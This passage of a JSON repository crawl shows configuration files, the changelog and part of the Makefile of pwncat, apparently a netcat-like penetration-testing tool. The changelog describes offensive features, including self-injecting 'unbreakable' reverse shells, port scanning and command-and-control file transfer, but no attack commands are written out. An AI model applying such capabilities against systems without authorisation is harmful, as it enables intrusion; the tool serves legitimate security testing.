{
  "metadata": {
    "timestamp": 1736568474782,
    "page": 448,
    "hasNextPage": true,
    "endCursor": "Y3Vyc29yOjQ0OQ==",
    "completionStatus": "IN_PROGRESS"
  },
  "repositories": [
    {
      "nameWithOwner": "cytopia/pwncat",
      "stars": 1811,
      "defaultBranch": "master",
      "files": [
        {
          "name": ".editorconfig",
          "type": "blob",
          "size": 0.43359375,
          "content": "# top-most EditorConfig file\nroot = true\n\n# Default for all files\n[*]\ncharset = utf-8\nend_of_line = lf\ninsert_final_newline = true\ntrim_trailing_whitespace = true\n\n# Custom files\n[*.py]\nindent_style = space\nindent_size = 4\n\n[.sh}]\nindent_style = tab\nindent_size = 4\n\n[Makefile]\nindent_style = tab\nindent_size = 4\n\n[*.{yml,yaml}]\nindent_style = space\nindent_size = 2\n\n[*.md]\nindent_style = space\ntrim_trailing_whitespace = false\nindent_size = 2\n"
        },
        {
          "name": ".github",
          "type": "tree",
          "content": null
        },
        {
          "name": ".gitignore",
          "type": "blob",
          "size": 0.892578125,
          "content": "# --------------------------------------------------------------------------------------------------\n# Python cache\n# --------------------------------------------------------------------------------------------------\n__pycache__\n*.pyc\n\n\n# --------------------------------------------------------------------------------------------------\n# Build artifacts\n# --------------------------------------------------------------------------------------------------\n.mypy_cache/*\npwncat.egg-info/\npwncat.egg-info/\nbuild/\ndist/\n\n# Ignore custom package builds\nshare/pkg/blackarch\nshare/pkg/brew\nshare/pkg/nixos\nshare/pkg/pentoo\n\n# rtd\nshare/doc/_build/\nshare/doc/make.bat\nshare/doc/linkcheck\nshare/doc/venv\n\n\n# --------------------------------------------------------------------------------------------------\n# Tests\n# --------------------------------------------------------------------------------------------------\n.env\n"
        },
        {
          "name": ".readthedocs.yaml",
          "type": "blob",
          "size": 0.3583984375,
          "content": "# Required\nversion: 2\n\n# Build documentation in the docs/ directory with Sphinx\nsphinx:\n   configuration: share/doc/conf.py\n\n# Optionally build your docs in additional formats such as PDF\nformats: []\n\n# Optionally set the version of Python and requirements required to build your docs\npython:\n   version: 3.7\n   install:\n   - requirements: share/doc/requirements.txt\n"
        },
        {
          "name": "CHANGELOG.md",
          "type": "blob",
          "size": 6.7431640625,
          "content": "# Changelog\n\n\n## Unreleased\n\n\n## Release 0.1.2\n\n### Fixes\n- Fixes: [#109](https://github.com/cytopia/pwncat/issues/109) when pasting in term I donot get full line echo\n\n\n## Release 0.1.1\n\n### Fixes\n- Fixes: pwncat will re-accept during local portforwarding if the client quits (previously pwncat shutdown)\n\n\n## Release 0.1.0\n\n### Fixes\n- Fixed UTF-8 char conversion for Python3\n- Fixed calculation for socket bytes sent\n- Fixed shutdown handling for port scanner\n- Fixed false positives for port scanner\n- Fixed sending binary data from stdin\n- Fixed self-inject mode if remote sends greetings or prefixes: #83\n- Fixed remote command to respawn if it crashes due to bad user input\n\n### Added\n- Implemented signal handler to distribute shutdown signals across threads\n- Feature: `--no-shutdown` to copy the behaviour of OpenBSD netcat to keep stdin open after EOF\n- Feature: `--http`\n- Feature: `send-on-eof`\n- CI: Integration tests for inject shell\n- CI: Integration tests for different file transfer modes\n- Added artwork\n\n### Changed\n- Changed behaviour to close after EOF on stdin (can be reverted via `--no-shutdown`)\n- Added faster method to validate remote files in CNC mode\n\n\n## Release 0.0.23-alpha\n\n### Fixed\n- Fixed freeze in raw mode: #81\n\n### Added\n- Install instructions for ArchLinux\n\n\n## Release 0.0.22-alpha\n\n### Added\n- Feature: Rebind forever: `--rebind`: #44\n- Feature: Wait between rebind attempts: `--rebind-wait`: #45\n- Feature: Port hopping for rebinds: `--rebind-robin`: #46\n- Feature: Send initial ping `--ping-init`: #48\n- Feature: Zero-I/O mode (port scan) `--zero`: #32\n- Feature: Safeword: `--safe-word`: #51\n- Feature: Stateless UDP connect: `--udp-sconnect` and `--udp-sconnect-word`: #79\n\n### Changes\n- Re-organized command line arguments for better overview\n\n\n## Release 0.0.21-alpha\n\n### Added\n- Feature: Be able to inject multiple reverse shells `--self-inject` by specifying a port list (comma separated, range or increment): https://www.youtube.com/watch?v=VQyFoUG18WY\n\n### Changed\n- port argument not only takes comma seperated value or range, but now also an increment: `443+10`\n\n\n## Release 0.0.20-alpha\n\n### Added\n- Feature: Be able to specify source address and port for clients: #66\n\n\n## Release 0.0.19-alpha\n\n### Added\n- Feature: Dualstack IPv4 and IPv6 by default (use `-4` or `-6` to use either of them alone)\n- Feature: Allow `addr` part in `--local` to be optional for consistency: #54\n- Feature: Have a stateful connect phase for UDP\n- CI: Run integration tests for any combination of IPv4, IPv6, TCP, UDP, specific bind and wildcard bind\n\n### Fixes\n- Ensure remote hostname is mandatory for `--local`/`-L` mode\n\n\n## Release 0.0.18-alpha\n\n### Added\n- Feature: IP ToS selection (`-T`/`--tos`)\n- Feature: Print socket options (`--info`) for socket, IPv4, IPv6 and/or TCP\n\n\n## Release 0.0.17-alpha\n\n### Fixed\n- CI: Fixed test frameworks for error checking\n\n### Added\n- Feature: IPv6 support (`-6`)\n\n#### Changed\n- Changed `--rebind` to allow omitting an argument for endless connect retries\n\n\n## Release 0.0.16-alpha\n\n### Added\n- Added self-injecting unbreakable pwncat reverse shell\n\n\n## Release 0.0.15-alpha\n\n#### Fixed\n- Fixed broken pipe with `tail -F`\n\n#### Changed\n- CI: Retry with different port on test failure\n\n\n## Release 0.0.14-alpha\n\n#### Added\n- Added feature: Made `PSEStore` instance available to all PSE scripts to persist data, interacti with sockets, stop signal and logger\n- Added chat-bot PSE\n- Added documentation for PSE API\n\n\n## Release 0.0.13-alpha\n\n#### Added\n- Feature: Client port hopping (`--reconn-robin`): #43\n\n\n## Release 0.0.12-alpha\n\n#### Added\n- Feature: Adedd PSE: Pwncat Scripting Engine (`--script-send` and `--script-recv`): #62\n\n\n## Release 0.0.11-alpha\n\n#### Fixed\n- Fixed various bugs with `--reconn`, `--keep-open`, `--local` and `--remote`\n- Fixed various bugs with threads\n- Fixed shutdown behaviour with Ctrl+c for --keep-open\n- Fixed shutdown behaviour with Ctrl+c for --reconn\n\n#### Added\n- Feature: Custom ping word (`--ping-word`): #49\n- Python type coverage report\n- CI: Added ca. 13,000 LoC integration tests and fixed findings accordingly\n- CI: Added dockerized interactive tests to simulate Ctrl+c\n\n#### Changed\n- Code: really heavy heavy code refactoring\n- Option: `-C`/`--crlf` now takes an argument to either force LF, CRLF or CR or even remove line feeds altogether on input AND output (or keep as it is, if not specified)\n- Modularized code for better plugin integration\n- Fixes #47 Change `--udp-*` options to `--*` to allow both, UDP and TCP\n\n\n## Release 0.0.10-alpha\n\n#### Added\n- CI: pylinyt\n- CI: mypy\n\n#### Changed\n- Code: heavy refactoring\n- CI: separate jobs\n- API: switched from pdoc to pdoc3\n\n\n## Release 0.0.9-alpha\n\n#### Added\n- Feature: colorized logging (`-c`/`--color`): #56\n\n\n## Release 0.0.8-alpha\n\n#### Added\n- Feature: implemented remote port forwarding mode: `-R`/`--remote`\n\n\n## Release 0.0.7-alpha\n\n#### Fixed\n- Fixed `-L`/`--local` mode to now persist multiple requests\n- Fixed `-C`/`--crlf` Only replace `\\n` with `\\r\\n` if `\\n` exists and don't blindly add.\n\n#### Added\n- Integration tests for `L`/`--local` mode\n\n#### Changed\n- Plugin architecture has been heavily refactored to make it easier to add new plugins\n- Improved logging\n\n\n## Release 0.0.6-alpha\n\n#### Fixed\n- Fixed `-n`/`--nodns` to actually not resolve DNS\n- Fixed various threading issues\n\n#### Added\n- Check for unimplemented options\n- Feature: Made socket receive non-blocking\n- Feature: Made stdin non-blocking (except for Windows)\n- Documentation: man page\n- Documentation: updated readme and contribution guidelines\n- CI: lots of integration tests for Linux, MacOS and Windows\n\n#### Changed\n- Changed daemon threads to non-daemon threads\n- Use Python's `logging` module instead of self-written one\n- Usage options have changed drastically\n- Changed `--reconn` and `--reconn-wait` to keep open (`-k`/`--keep`)\n\n#### Removed\n- Removed `builtins` import for cross-os base install compatibility\n\n\n## Release 0.0.5-alpha\n\n#### Added\n- Feature: Local port forward (`-L`)\n\n\n## Release 0.0.4-alpha\n\n#### Added\n- Feature: UDP connect mode interval ping (`--udp-ping-intvl`) for unbreakable UDP reverse shells\n\n\n## Release 0.0.3-alpha\n\n#### Fixed\n- Hardened Python 2/3 string compatibility\n- Checking against mutually exclusive arguments\n- Fix crash while checking for Mac newlines `\\r`\n\n#### Added\n- Editorconfig\n- Feature: Re-connect/Re-listen on connection abort (`--reconn`)\n- Feature: Re-connect/Re-listen on connection abort (`--reconn-wait`)\n\n\n## Release 0.0.2-alpha\n\n#### Added\n- Feature: Execute shell commands (`-e/--exec`)\n- Feature: Skip DNS resolution (`-n/--nodns`)\n- Documentation: API docs\n\n#### Changed\n- Renamed project from netcat to pwncat\n\n\n## Release 0.0.1-alpha\n\n#### Added\n- Feature: Listen\n- Feature: Connect\n- Feature: UDP mode\n- Feature: Change linefeeds (LF vs CRLF)\n- Feature: Verbosity\n"
        },
        {
          "name": "CONTRIBUTING.md",
          "type": "blob",
          "size": 0.5732421875,
          "content": "# Contributing\n\n\n### Generel\n* Star this project to keep me going\n* Use `pwncat` and report bugs\n* Use `pwncat` and request features\n* Submit exotic example use cases\n* Check the issues and see if you can help\n\n### Documentation\n* Find and fix spelling and grammar mistakes\n* Improve man page\n* Build and improve github page\n* Suggest things to improve\n\n### Packages\n* Maintainer for `.deb` and `.rpm` packages wanted\n* Maintainer for `brew` packages wanted\n* Review pip package\n\n###  Code\n* Review the code\n* Comment the code\n* Add features\n* Fix bugs\n\n### Other\n* Anything I've missed\n"
        },
        {
          "name": "LICENSE.txt",
          "type": "blob",
          "size": 1.0673828125,
          "content": "MIT License\n\nCopyright (c) 2020 cytopia <https://github.com/cytopia>\n\nPermission is hereby granted, free of charge, to any person obtaining a copy\nof this software and associated documentation files (the \"Software\"), to deal\nin the Software without restriction, including without limitation the rights\nto use, copy, modify, merge, publish, distribute, sublicense, and/or sell\ncopies of the Software, and to permit persons to whom the Software is\nfurnished to do so, subject to the following conditions:\n\nThe above copyright notice and this permission notice shall be included in all\ncopies or substantial portions of the Software.\n\nTHE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\nIMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\nFITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\nAUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\nLIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\nOUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\nSOFTWARE.\n"
        },
        {
          "name": "Makefile",
          "type": "blob",
          "size": 35.6787109375,
          "content": "ifneq (,)\n.error This Makefile requires GNU Make.\nendif\n\n# -------------------------------------------------------------------------------------------------\n# Can be changed\n# -------------------------------------------------------------------------------------------------\n# This can be adjusted\nPYTHON_VERSION = 2.7\n\n\n# -------------------------------------------------------------------------------------------------\n# Default configuration\n# -------------------------------------------------------------------------------------------------\n.PHONY: help lint code test smoke autoformat docs pipeline build deploy clean\n\nBINPATH = bin/\nMANPATH = man/\nDOCPATH = docs/\nINTPATH = tests/integration/\nBINNAME = pwncat\n\nFL_VERSION = 0.4\nFL_IGNORES = .git/,.github/,$(BINNAME).egg-info,docs/$(BINNAME).api.html,docs/,data/,.mypy_cache/,share/doc/venv,share/doc/_build,share/pkg/nixos,share/pkg/blackarch/\n\nUID := $(shell id -u)\nGID := $(shell id -g)\n\n\n# -------------------------------------------------------------------------------------------------\n# Default Target\n# -------------------------------------------------------------------------------------------------\nhelp:\n\t@echo \" ██▓███   █     █░ ███▄    █  ▄████▄   ▄▄▄      ▄▄▄█████▓\"\n\t@echo \"▓██░  ██▒▓█░ █ ░█░ ██ ▀█   █ ▒██▀ ▀█  ▒████▄    ▓  ██▒ ▓▒\"\n\t@echo \"▓██░ ██▓▒▒█░ █ ░█ ▓██  ▀█ ██▒▒▓█    ▄ ▒██  ▀█▄  ▒ ▓██░ ▒░\"\n\t@echo \"▒██▄█▓▒ ▒░█░ █ ░█ ▓██▒  ▐▌██▒▒▓▓▄ ▄██▒░██▄▄▄▄██ ░ ▓██▓ ░ \"\n\t@echo \"▒██▒ ░  ░░░██▒██▓ ▒██░   ▓██░▒ ▓███▀ ░ ▓█   ▓██▒  ▒██▒ ░ \"\n\t@echo \"▒▓▒░ ░  ░░ ▓░▒ ▒  ░ ▒░   ▒ ▒ ░ ░▒ ▒  ░ ▒▒   ▓▒█░  ▒ ░░   \"\n\t@echo \"░▒ ░       ▒ ░ ░  ░ ░░   ░ ▒░  ░  ▒     ▒   ▒▒ ░    ░    \"\n\t@echo \"░░         ░   ░     ░   ░ ░ ░          ░   ▒     ░      \"\n\t@echo \"             ░             ░ ░ ░            ░  ░         \"\n\t@echo \"                             ░                           \"\n\t@echo\n\t@echo \"lint             Lint repository\"\n\t@echo \"code             Lint source code\"\n\t@echo \"test             Run integration tests\"\n\t@echo \"smoke            Run smokke tests (dockerized)\"\n\t@echo \"autoformat       Autoformat code according to Python black\"\n\t@echo\n\t@echo \"docs             Update code documentation\"\n\t@echo \"pipeline         Update GitHub action workflow pipelines\"\n\t@echo\n\t@echo \"build            Build Python pkg, source and binary dist\"\n\t@echo \"deploy           Deploy pip package\"\n\t@echo \"clean            Clean the Build\"\n\n\n# -------------------------------------------------------------------------------------------------\n# Lint Targets\n# -------------------------------------------------------------------------------------------------\nlint: _lint-files\nlint: _lint-version\nlint: _lint-usage\nlint: _lint-docs\nlint: _lint-man\nlint: _lint-pipeline\n\n.PHONY: _lint-version\n_lint-version:\n\t@echo \"# -------------------------------------------------------------------- #\"\n\t@echo \"# Check version config\"\n\t@echo \"# -------------------------------------------------------------------- #\"\n\t@VERSION_PWNCAT=$$( grep -E '^VERSION = \"[.0-9]+(-\\w+)?\"' bin/pwncat | awk -F'\"' '{print $$2}' || true ); \\\n\tVERSION_SETUP=$$( grep version= setup.py | awk -F'\"' '{print $$2}' || true ); \\\n\tVERSION_CHANGE=$$( grep -E '## Release [.0-9]+(-\\w+)?$$' CHANGELOG.md | head -1 | sed 's/.*[[:space:]]//g' || true ); \\\n\tif [ \"$${VERSION_PWNCAT}\" != \"$${VERSION_SETUP}\" ] || [ \"$${VERSION_SETUP}\" != \"$${VERSION_CHANGE}\" ]; then \\\n\t\techo \"[ERROR] Version mismatch\"; \\\n\t\techo \"bin/pwncat:   $${VERSION_PWNCAT}\"; \\\n\t\techo \"setup.py:     $${VERSION_SETUP}\"; \\\n\t\techo \"CHANGELOG.md: $${VERSION_CHANGE}    # Looking for latest entry with regex format: '## Release [.0-9]+(\\w+)?$$'\" ; \\\n\t\texit 1; \\\n\telse \\\n\t\techo \"[OK] Version match\"; \\\n\t\techo \"bin/pwncat:   $${VERSION_PWNCAT}\"; \\\n\t\techo \"setup.py:     $${VERSION_SETUP}\"; \\\n\t\techo \"CHANGELOG.md: $${VERSION_CHANGE}\"; \\\n\t\texit 0; \\\n\tfi \\\n\n.PHONY: _lint-usage\n_lint-usage: SHELL := /bin/bash\n_lint-usage:\n\t@echo \"# -------------------------------------------------------------------- #\"\n\t@echo \"# Lint usage\"\n\t@echo \"# -------------------------------------------------------------------- #\"\n\t$(PWD)/tests/bin/check-usage.sh\n\n.PHONY: _lint-files\n_lint-files:\n\t@echo \"# --------------------------------------------------------------------\"\n\t@echo \"# Lint files\"\n\t@echo \"# -------------------------------------------------------------------- #\"\n\t@docker run --rm $$(tty -s && echo \"-it\" || echo) -v $(PWD):/data cytopia/file-lint:$(FL_VERSION) file-cr --text --ignore '$(FL_IGNORES)' --path .\n\t@docker run --rm $$(tty -s && echo \"-it\" || echo) -v $(PWD):/data cytopia/file-lint:$(FL_VERSION) file-crlf --text --ignore '$(FL_IGNORES)' --path .\n\t@docker run --rm $$(tty -s && echo \"-it\" || echo) -v $(PWD):/data cytopia/file-lint:$(FL_VERSION) file-trailing-single-newline --text --ignore '$(FL_IGNORES)' --path .\n\t@docker run --rm $$(tty -s && echo \"-it\" || echo) -v $(PWD):/data cytopia/file-lint:$(FL_VERSION) file-trailing-space --text --ignore '$(FL_IGNORES)' --path .\n\t@docker run --rm $$(tty -s && echo \"-it\" || echo) -v $(PWD):/data cytopia/file-lint:$(FL_VERSION) file-utf8 --text --ignore '$(FL_IGNORES)' --path .\n\t@docker run --rm $$(tty -s && echo \"-it\" || echo) -v $(PWD):/data cytopia/file-lint:$(FL_VERSION) file-utf8-bom --text --ignore '$(FL_IGNORES)' --path .\n\t@docker run --rm $$(tty -s && echo \"-it\" || echo) -v $(PWD):/data cytopia/file-lint:$(FL_VERSION) git-conflicts --text --ignore '$(FL_IGNORES)' --path .\n\n.PHONY: _lint-docs\n_lint-docs:\n\t@echo \"# -------------------------------------------------------------------- #\"\n\t@echo \"# Lint docs\"\n\t@echo \"# -------------------------------------------------------------------- #\"\n\t@$(MAKE) --no-print-directory docs\n\tgit diff --quiet -- $(DOCPATH) || { echo \"Build Changes\"; git diff | cat; git status; false; }\n\tgit diff --quiet -- $(PWD)/README.md || { echo \"Build Changes\"; git diff | cat; git status; false; }\n\n.PHONY: _lint-man\n_lint-man:\n\t@echo \"# -------------------------------------------------------------------- #\"\n\t@echo \"# Lint man page\"\n\t@echo \"# -------------------------------------------------------------------- #\"\n\t@$(MAKE) --no-print-directory man\n\tgit diff --quiet -- $(DOCPATH) $(MANPATH) || { echo \"Build Changes\"; git diff | cat; git status; false; }\n\n.PHONY: _lint-pipeline\n_lint-pipeline:\n\t@echo \"# -------------------------------------------------------------------- #\"\n\t@echo \"# Lint Pipelines\"\n\t@echo \"# -------------------------------------------------------------------- #\"\n\t@$(MAKE) --no-print-directory pipeline\n\tgit diff --quiet -- .github/workflows || { echo \"Build Changes\"; git diff | cat; git status; false; }\n\n\n# -------------------------------------------------------------------------------------------------\n# Code Style Targets\n# -------------------------------------------------------------------------------------------------\ncode: _code-pycodestyle\ncode: _code-pydocstyle\ncode: _code-pylint\ncode: _code-black\ncode: _code-mypy\n\n.PHONY: _code-pycodestyle\n_code-pycodestyle:\n\t@V=\"$$( docker run --rm cytopia/pycodestyle --version | head -1 )\"; \\\n\techo \"# -------------------------------------------------------------------- #\"; \\\n\techo \"# Check pycodestyle: $${V}\"; \\\n\techo \"# -------------------------------------------------------------------- #\"\n\t@#\n\tdocker pull cytopia/pycodestyle\n\tdocker run --rm $$(tty -s && echo \"-it\" || echo) -v $(PWD):/data --entrypoint= cytopia/pycodestyle sh -c ' \\\n\t\tmkdir -p /tmp \\\n\t\t&& cp $(BINPATH)$(BINNAME) /tmp/$(BINNAME).py \\\n\t\t&& pycodestyle --config=setup.cfg /tmp/$(BINNAME).py'\n\n.PHONY: _code-pydocstyle\n_code-pydocstyle:\n\t@V=\"$$( docker run --rm cytopia/pydocstyle --version | head -1 )\"; \\\n\techo \"# -------------------------------------------------------------------- #\"; \\\n\techo \"# Check pydocstyle: $${V}\"; \\\n\techo \"# -------------------------------------------------------------------- #\"\n\t@#\n\tdocker pull cytopia/pydocstyle\n\tdocker run --rm $$(tty -s && echo \"-it\" || echo) -v $(PWD):/data --entrypoint= cytopia/pydocstyle sh -c ' \\\n\t\tmkdir -p /tmp \\\n\t\t&& cp $(BINPATH)$(BINNAME) /tmp/$(BINNAME).py \\\n\t\t&& pydocstyle --explain --config=setup.cfg /tmp/$(BINNAME).py'\n\n.PHONY: _code-pylint\n_code-pylint:\n\t@V=\"$$( docker run --rm cytopia/pylint --version | head -1 )\"; \\\n\techo \"# -------------------------------------------------------------------- #\"; \\\n\techo \"# Check pylint: $${V}\"; \\\n\techo \"# -------------------------------------------------------------------- #\"\n\t@#\n\tdocker pull cytopia/pylint\n\tdocker run --rm $$(tty -s && echo \"-it\" || echo) -v $(PWD):/data --entrypoint= cytopia/pylint sh -c ' \\\n\t\tmkdir -p /tmp \\\n\t\t&& cp $(BINPATH)$(BINNAME) /tmp/$(BINNAME).py \\\n\t\t&& pylint --rcfile=setup.cfg /tmp/$(BINNAME).py'\n\n.PHONY: _code-black\n_code-black:\n\t@V=\"$$( docker run --rm cytopia/black --version | head -1 )\"; \\\n\techo \"# -------------------------------------------------------------------- #\"; \\\n\techo \"# Check Python Black: $${V}\"; \\\n\techo \"# -------------------------------------------------------------------- #\"\n\t@#\n\tdocker pull cytopia/black\n\tdocker run --rm $$(tty -s && echo \"-it\" || echo) -v ${PWD}:/data --entrypoint= cytopia/black sh -c ' \\\n\t\tmkdir -p /tmp \\\n\t\t&& cp $(BINPATH)$(BINNAME) /tmp/$(BINNAME).py \\\n\t\t&& black -l 100 --check --diff /tmp/$(BINNAME).py'\n\n.PHONY: _code-mypy\n_code-mypy:\n\t@V=\"$$( docker run --rm cytopia/mypy --version | head -1 )\"; \\\n\techo \"# -------------------------------------------------------------------- #\"; \\\n\techo \"# Check Mypy: $${V}\"; \\\n\techo \"# -------------------------------------------------------------------- #\"\n\t@#\n\tdocker pull cytopia/mypy\n\tdocker run --rm $$(tty -s && echo \"-it\" || echo) -v ${PWD}:/data --entrypoint= cytopia/mypy sh -c ' \\\n\t\tmkdir -p /tmp \\\n\t\t&& cp $(BINPATH)$(BINNAME) /tmp/$(BINNAME).py \\\n\t\t&& mypy --config-file setup.cfg /tmp/$(BINNAME).py'\n\n\n# -------------------------------------------------------------------------------------------------\n# Smoke Targets\n# -------------------------------------------------------------------------------------------------\nsmoke: _smoke-keep_open-kill_srv-before_send\nsmoke: _smoke-keep_open-kill_srv-send_data\nsmoke: _smoke-tcp_port_scan-no_banner\nsmoke: _smoke-tcp_port_scan-with_banner\nsmoke: _smoke-udp_port_scan-no_banner\nsmoke: _smoke-udp_port_scan-with_banner\n\n.PHONY:\n_smoke-keep_open-kill_srv-before_send:\n\t@# It's sometimes a race-condition, so we run it five times\n\ttests/smoke/run.sh \"200---tcp---keep_open---kill_server---no_send\" \"$(PYTHON_VERSION)\"\n\ttests/smoke/run.sh \"200---tcp---keep_open---kill_server---no_send\" \"$(PYTHON_VERSION)\"\n\ttests/smoke/run.sh \"200---tcp---keep_open---kill_server---no_send\" \"$(PYTHON_VERSION)\"\n\ttests/smoke/run.sh \"200---tcp---keep_open---kill_server---no_send\" \"$(PYTHON_VERSION)\"\n\ttests/smoke/run.sh \"200---tcp---keep_open---kill_server---no_send\" \"$(PYTHON_VERSION)\"\n\n_smoke-keep_open-kill_srv-send_data:\n\t@# It's sometimes a race-condition, so we run it five times\n\ttests/smoke/run.sh \"201---tcp---keep_open---kill_server---send_data\" \"$(PYTHON_VERSION)\"\n\ttests/smoke/run.sh \"201---tcp---keep_open---kill_server---send_data\" \"$(PYTHON_VERSION)\"\n\ttests/smoke/run.sh \"201---tcp---keep_open---kill_server---send_data\" \"$(PYTHON_VERSION)\"\n\ttests/smoke/run.sh \"201---tcp---keep_open---kill_server---send_data\" \"$(PYTHON_VERSION)\"\n\ttests/smoke/run.sh \"201---tcp---keep_open---kill_server---send_data\" \"$(PYTHON_VERSION)\"\n\n_smoke-tcp_port_scan-no_banner:\n\t@# It's sometimes a race-condition, so we run it five times\n\ttests/smoke/run.sh \"300---tcp---port_scan---no_banner\" \"$(PYTHON_VERSION)\"\n\ttests/smoke/run.sh \"300---tcp---port_scan---no_banner\" \"$(PYTHON_VERSION)\"\n\ttests/smoke/run.sh \"300---tcp---port_scan---no_banner\" \"$(PYTHON_VERSION)\"\n\ttests/smoke/run.sh \"300---tcp---port_scan---no_banner\" \"$(PYTHON_VERSION)\"\n\ttests/smoke/run.sh \"300---tcp---port_scan---no_banner\" \"$(PYTHON_VERSION)\"\n\n_smoke-tcp_port_scan-with_banner:\n\t@# It's sometimes a race-condition, so we run it five times\n\ttests/smoke/run.sh \"301---tcp---port_scan---with_banner\" \"$(PYTHON_VERSION)\"\n\ttests/smoke/run.sh \"301---tcp---port_scan---with_banner\" \"$(PYTHON_VERSION)\"\n\ttests/smoke/run.sh \"301---tcp---port_scan---with_banner\" \"$(PYTHON_VERSION)\"\n\ttests/smoke/run.sh \"301---tcp---port_scan---with_banner\" \"$(PYTHON_VERSION)\"\n\ttests/smoke/run.sh \"301---tcp---port_scan---with_banner\" \"$(PYTHON_VERSION)\"\n\n_smoke-udp_port_scan-no_banner:\n\t@# It's sometimes a race-condition, so we run it five times\n\ttests/smoke/run.sh \"302---udp---port_scan---no_banner\" \"$(PYTHON_VERSION)\"\n\ttests/smoke/run.sh \"302---udp---port_scan---no_banner\" \"$(PYTHON_VERSION)\"\n\ttests/smoke/run.sh \"302---udp---port_scan---no_banner\" \"$(PYTHON_VERSION)\"\n\ttests/smoke/run.sh \"302---udp---port_scan---no_banner\" \"$(PYTHON_VERSION)\"\n\ttests/smoke/run.sh \"302---udp---port_scan---no_banner\" \"$(PYTHON_VERSION)\"\n\n_smoke-udp_port_scan-with_banner:\n\t@# It's sometimes a race-condition, so we run it five times\n\ttests/smoke/run.sh \"303---udp---port_scan---with_banner\" \"$(PYTHON_VERSION)\"\n\ttests/smoke/run.sh \"303---udp---port_scan---with_banner\" \"$(PYTHON_VERSION)\"\n\ttests/smoke/run.sh \"303---udp---port_scan---with_banner\" \"$(PYTHON_VERSION)\"\n\ttests/smoke/run.sh \"303---udp---port_scan---with_banner\" \"$(PYTHON_VERSION)\"\n\ttests/smoke/run.sh \"303---udp---port_scan---with_banner\" \"$(PYTHON_VERSION)\"\n\n\n# -------------------------------------------------------------------------------------------------\n# Test Targets\n# -------------------------------------------------------------------------------------------------\nTEST_PWNCAT_HOST=localhost\nTEST_PWNCAT_PORT=4444\nTEST_PWNCAT_WAIT=2\nTEST_PWNCAT_RUNS=1\ntest: _test-behaviour-quit--client\ntest: _test-behaviour-quit--server\ntest: _test-behaviour-base--file_transfer\ntest: _test-mode--local_forward\ntest: _test-mode--remote_forward\ntest: _test-options--nodns\ntest: _test-options--crlf\ntest: _test-options--keep_open\ntest: _test-options--reconn\ntest: _test-options--ping_intvl\ntest: _test-options--ping_word\ntest: _test-cnc--inject_shell\n\n.PHONY: _test-behaviour-quit--client\n_test-behaviour-quit--client: __test-behaviour-quit--client-000\n_test-behaviour-quit--client: __test-behaviour-quit--client-001\n_test-behaviour-quit--client: __test-behaviour-quit--client-002\n_test-behaviour-quit--client: __test-behaviour-quit--client-003\n_test-behaviour-quit--client: __test-behaviour-quit--client-004\n_test-behaviour-quit--client: __test-behaviour-quit--client-100\n_test-behaviour-quit--client: __test-behaviour-quit--client-101\n_test-behaviour-quit--client: __test-behaviour-quit--client-102\n_test-behaviour-quit--client: __test-behaviour-quit--client-103\n_test-behaviour-quit--client: __test-behaviour-quit--client-200\n_test-behaviour-quit--client: __test-behaviour-quit--client-201\n__test-behaviour-quit--client-000:\n\t$(INTPATH)01-behaviour-quit--client/000---tcp---client_quits---when_server_is_killed---client_default---before_send.sh \\\n\t\t\"$(TEST_PWNCAT_HOST)\" \"$(TEST_PWNCAT_PORT)\" \"$(TEST_PWNCAT_WAIT)\" \"$(TEST_PWNCAT_RUNS)\" \"$(TEST_PYTHON_VERSION)\"\n__test-behaviour-quit--client-001:\n\t$(INTPATH)01-behaviour-quit--client/001---tcp---client_quits---when_server_is_killed---client_default---after_client_sent_data.sh \\\n\t\t\"$(TEST_PWNCAT_HOST)\" \"$(TEST_PWNCAT_PORT)\" \"$(TEST_PWNCAT_WAIT)\" \"$(TEST_PWNCAT_RUNS)\" \"$(TEST_PYTHON_VERSION)\"\n__test-behaviour-quit--client-002:\n\t$(INTPATH)01-behaviour-quit--client/002---tcp---client_quits---when_server_is_killed---client_default---after_server_sent_data.sh \\\n\t\t\"$(TEST_PWNCAT_HOST)\" \"$(TEST_PWNCAT_PORT)\" \"$(TEST_PWNCAT_WAIT)\" \"$(TEST_PWNCAT_RUNS)\" \"$(TEST_PYTHON_VERSION)\"\n__test-behaviour-quit--client-003:\n\t$(INTPATH)01-behaviour-quit--client/003---tcp---client_quits---when_server_is_killed---client_command---before_send.sh \\\n\t\t\"$(TEST_PWNCAT_HOST)\" \"$(TEST_PWNCAT_PORT)\" \"$(TEST_PWNCAT_WAIT)\" \"$(TEST_PWNCAT_RUNS)\" \"$(TEST_PYTHON_VERSION)\"\n__test-behaviour-quit--client-004:\n\t$(INTPATH)01-behaviour-quit--client/004---tcp---client_quits---when_server_is_killed---client_command---after_server_sent_command.sh \\\n\t\t\"$(TEST_PWNCAT_HOST)\" \"$(TEST_PWNCAT_PORT)\" \"$(TEST_PWNCAT_WAIT)\" \"$(TEST_PWNCAT_RUNS)\" \"$(TEST_PYTHON_VERSION)\"\n__test-behaviour-quit--client-100:\n\t$(INTPATH)01-behaviour-quit--client/100---udp---client_stays---when_server_is_killed---client_default---before_send.sh \\\n\t\t\"$(TEST_PWNCAT_HOST)\" \"$(TEST_PWNCAT_PORT)\" \"$(TEST_PWNCAT_WAIT)\" \"$(TEST_PWNCAT_RUNS)\" \"$(TEST_PYTHON_VERSION)\"\n__test-behaviour-quit--client-101:\n\t$(INTPATH)01-behaviour-quit--client/101---udp---client_stays---when_server_is_killed---client_default---after_client_sent_data.sh \\\n\t\t\"$(TEST_PWNCAT_HOST)\" \"$(TEST_PWNCAT_PORT)\" \"$(TEST_PWNCAT_WAIT)\" \"$(TEST_PWNCAT_RUNS)\" \"$(TEST_PYTHON_VERSION)\"\n__test-behaviour-quit--client-102:\n\t$(INTPATH)01-behaviour-quit--client/102---udp---client_stays---when_server_is_killed---client_default---after_server_sent_data.sh \\\n\t\t\"$(TEST_PWNCAT_HOST)\" \"$(TEST_PWNCAT_PORT)\" \"$(TEST_PWNCAT_WAIT)\" \"$(TEST_PWNCAT_RUNS)\" 